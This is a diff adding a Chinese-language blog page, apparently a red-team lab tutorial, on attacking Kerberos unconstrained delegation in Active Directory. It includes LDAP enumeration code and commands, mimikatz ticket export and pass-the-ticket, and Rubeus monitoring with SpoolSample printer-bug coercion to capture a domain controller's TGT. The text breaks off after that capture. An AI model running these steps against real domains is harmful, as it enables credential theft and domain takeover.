@@ -1,0 +1,1784 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="姐姐我们不约">
+<meta property="og:type" content="website">
+<meta property="og:title" content="我是GG还是MM">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="我是GG还是MM">
+<meta property="og:description" content="姐姐我们不约">
+<meta property="og:locale">
+<meta property="article:author" content="1">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/"/>
+
+
+
+
+
+  <title>我是GG还是MM</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+<a target="_blank" rel="noopener" href="https://github.com/yicunyiye" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">我是GG还是MM</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/" itemprop="url">kerberos委派</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-03T21:33:37+08:00">
+                2021-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x00-c-检测委派账户"><a href="#0x00-c-检测委派账户" class="headerlink" title="0x00 c#检测委派账户"></a>0x00 c#检测委派账户</h1><p>前文已经写到检测域内dcsync，adminsdholder等后门和一些基本域内信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">public static void Checkdelegation()</span><br><span class="line">        &#123;</span><br><span class="line">            Ldapcoon.LDAP_COON();</span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========非约束性委派主机===========&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string computers = &quot;&quot;;</span><br><span class="line">                string groupdescription = &quot;&quot;;</span><br><span class="line">                computers = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">                Console.WriteLine(computers);</span><br><span class="line">                //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">                //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========非约束性委派用户===========&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string groupdescription = &quot;&quot;;</span><br><span class="line">                users = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">                Console.WriteLine(users);</span><br><span class="line">                //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">                //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========约束性委派用户=============&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string target = &quot;&quot;;</span><br><span class="line">                int user_count = 0;</span><br><span class="line">                int target_count = 0;</span><br><span class="line">                int len = 0;</span><br><span class="line"></span><br><span class="line">                user_count = r.Properties[&quot;distinguishedName&quot;].Count;</span><br><span class="line">                target_count = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;].Count;</span><br><span class="line"></span><br><span class="line">                while (len &lt; user_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;distinguishedName&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                len = 0;</span><br><span class="line">                Font.Warning();</span><br><span class="line">                Console.WriteLine(&quot;\r\ntarget SPN&quot;);</span><br><span class="line">                Font.NormailFonts();</span><br><span class="line">                while (len &lt; target_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    target = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(target);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========约束性委派主机=============&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string target = &quot;&quot;;</span><br><span class="line">                int user_count = 0;</span><br><span class="line">                int target_count = 0;</span><br><span class="line">                int len = 0;</span><br><span class="line"></span><br><span class="line">                user_count = r.Properties[&quot;distinguishedName&quot;].Count;</span><br><span class="line">                target_count = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;].Count;</span><br><span class="line"></span><br><span class="line">                while(len &lt; user_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;distinguishedName&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                len = 0;</span><br><span class="line">                Font.Warning();</span><br><span class="line">                Console.WriteLine(&quot;\r\ntarget SPN&quot;);</span><br><span class="line">                Font.NormailFonts();</span><br><span class="line">                while (len &lt; target_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    target = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(target);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为约束性委派会指定委派的对象可能为多个所以我们先检测他的count然后再遍历输出。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXi1Mw.png" alt="wXi1Mw.png"></p>
+<h1 id="0x01委派"><a href="#0x01委派" class="headerlink" title="0x01委派"></a>0x01委派</h1><p>委派：当用户A基于kerberos验证去请求B服务，B服务使用A的身份去请求服务C。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png"></p>
+<ul>
+<li>域内用户jack以Kerberos方式认证后访问Web服务器；</li>
+<li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</li>
+<li>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</li>
+<li>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</li>
+<li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</li>
+<li>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</li>
+</ul>
+<p>在域内只有<strong>服务账号</strong>和<strong>机器账号</strong>才具有委派属性。</p>
+<p><strong>机器账号</strong>就是AD活动目录中 Computers 中的计算机(一个普通域用户默认最多可以创建十个主机账号)。</p>
+<p><strong>服务账号</strong>（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。</p>
+<p>当用户被设置为不允许被委派，那么就不能委派。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXId46.png" alt="wXId46.png"></p>
+<p>委派可以分为：</p>
+<p><strong>非约束性委派</strong></p>
+<p><strong>约束性委派</strong></p>
+<p><strong>基于资源的约束委派</strong></p>
+<h2 id="0x02-非约束委派"><a href="#0x02-非约束委派" class="headerlink" title="0x02 非约束委派"></a>0x02 非约束委派</h2><p>操作环境：</p>
+<blockquote>
+<p>域：redteam.local</p>
+<p>域控：DC.redteam.local。主机名：DC。ip：192.168.11.16</p>
+<p>域管账户：Administrator/test123..</p>
+<p>域内机器：MSSQL.redteam。ip：192.168.11.8。普通账户：hack/test123..</p>
+</blockquote>
+<p><strong>前提：</strong>在机器账号B上配置了非约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问机器B的某个服务，于是向KDC认证。KDC会检查机器B的机器账号的属性，发现是非约束性委派，KDC会将用户的TGT放在ST服务票据中。</p>
+<p>2.用户访问机器B时，TGT票据会和ST服务票据一同发送给机器B</p>
+<p>3.这样B在验证ST服务票据的同时获取了用户的TGT，并将TGT存储在LSASS进程中，从而可以模拟用户访问任意服务</p>
+<p>从网络攻击的角度来看，如果攻击者控制了机器B的机器账号，并且机器B配置了非约束性委派。则攻击者可以诱骗管理员来访问机器B，然后攻击者可以获取管理员的TGT，从而模拟管理员访问任意服务，即获得了管理员权限。</p>
+<p>在非约束行委派中，服务账号可以获取被委派用户的TGT，然后把TGT存储在LSASS进程中，从而服务账号可以使用这个TGT去模拟用户访问任何服务。</p>
+<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code>。我们设置MSSQL这个机器。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXiyKM.png" alt="wXiyKM.png"></p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6jr7.png" alt="wX6jr7.png"></p>
+<p>当我们控制了机器账号MSSQL，然后诱导管理员来访问机器，就可以获得管理员的TGT，从而访问任何服务。</p>
+<h3 id="2-1-筛选非约束性委派的账号"><a href="#2-1-筛选非约束性委派的账号" class="headerlink" title="2.1 筛选非约束性委派的账号"></a>2.1 筛选非约束性委派的账号</h3><p>域控主机账户是默认开启非约束性委派</p>
+<h4 id="2-1-1-powerview-ps1"><a href="#2-1-1-powerview-ps1" class="headerlink" title="2.1.1 powerview.ps1"></a>2.1.1 powerview.ps1</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"> </span><br><span class="line">查询域中配置非约束委派的账户</span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">查询域中配置非约束委派的主机：</span><br><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt; <span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">DC.redteam.local</span><br><span class="line">mssql.redteam.local</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-1-2-ADFind"><a href="#2-1-2-ADFind" class="headerlink" title="2.1.2 ADFind"></a>2.1.2 ADFind</h4><p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br><span class="line">AdFind V01.56.00cpp Joe Richards (support@joeware.net) April 2021</span><br><span class="line"></span><br><span class="line">Using server: DC.redteam.local:389</span><br><span class="line">Directory: Windows Server 2016</span><br><span class="line"></span><br><span class="line">dn:CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: DC</span><br><span class="line">&gt;distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">dn:CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: MSSQL</span><br><span class="line">&gt;distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2 Objects returned</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-1-3-ldapsearch"><a href="#2-1-3-ldapsearch" class="headerlink" title="2.1.3 ldapsearch"></a>2.1.3 ldapsearch</h4><p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─#</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-2-非约束性委派攻击"><a href="#2-2-非约束性委派攻击" class="headerlink" title="2.2 非约束性委派攻击"></a>2.2 非约束性委派攻击</h3><p>我们在mssql这台机器访问域控。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6FzF.png" alt="wX6FzF.png"></p>
+<p>可以看到是访问是拒绝的。然后我们用域管账户去访问MSSQL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;dir \\MSSQL.redteam.local\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个时候在MSSQL这台机器的lsass.exe内存中会存在域管administrator账户的TGT票据。然后在MSSQL机器运行mimikatz。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">导出票据</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Rir.png" alt="wX6Rir.png"></p>
+<p>然后再注入票据到内存里面，再访问域控。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">导入票据</span><br><span class="line">kerberos::ptt xxx.kirbi</span><br><span class="line">查看票据</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6xqJ.png" alt="wX6xqJ.png"></p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Tx0.png" alt="wX6Tx0.png"></p>
+<h3 id="2-3-非约束性委派配合打印机"><a href="#2-3-非约束性委派配合打印机" class="headerlink" title="2.3 非约束性委派配合打印机"></a>2.3 非约束性委派配合打印机</h3><p>默认情况下Spooler服务是自动开启的。</p>
+<p>使用本地管理员身份运行Rubeus来监听事件id为4624的事件，然后时间设置为1秒，可以截取到域控的TGT。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br></pre></td></tr></table></figure>
+
+<p>然通过SpoolSample.exe向域控发起请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC MSSQL</span><br></pre></td></tr></table></figure>
+
+<p>Rubeus成功接受到了TGT</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIzwN.png" alt="wXIzwN.png"></p>
+<p>复制监听到的TGT的base64</p>
